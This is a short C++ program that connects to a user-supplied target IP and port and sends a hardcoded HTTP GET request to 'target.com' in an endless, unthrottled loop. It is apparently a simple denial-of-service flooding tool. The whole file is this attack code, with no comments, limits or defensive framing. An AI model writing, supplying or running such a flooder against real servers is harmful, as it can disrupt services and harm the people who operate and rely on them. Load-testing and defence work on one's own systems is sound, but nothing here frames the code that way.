#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>

int main(int argc, char *argv[]) {
    if(argc < 3){
        std::cout << "Usage: " << argv[0] << " <target IP> <port>\n";
        return 1;
    }

    const char* target_ip = argv[1];
    int target_port = std::stoi(argv[2]);

    struct sockaddr_in target_addr;
    std::memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) {
        std::cout << "Socket creation error\n";
        return 1;
    }

    if(connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
        std::cout << "Connection error\n";
        return 1;
    }

    while(true) {
        const char* message = "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n";
        send(sock, message, std::strlen(message), 0);
    }

    return 0;
}
